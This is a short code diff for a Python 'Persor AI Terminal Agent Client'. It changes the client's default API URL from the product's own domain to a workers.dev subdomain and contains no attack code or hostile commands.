@@ -5,7 +5,7 @@ import os
 
 # Persor AI Terminal Agent Client (Python)
 
-DEFAULT_URL = "https://persorai.com"
+DEFAULT_URL = "https://exclusive.istebutolga.workers.dev"
 
 def main():
     api_url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_URL
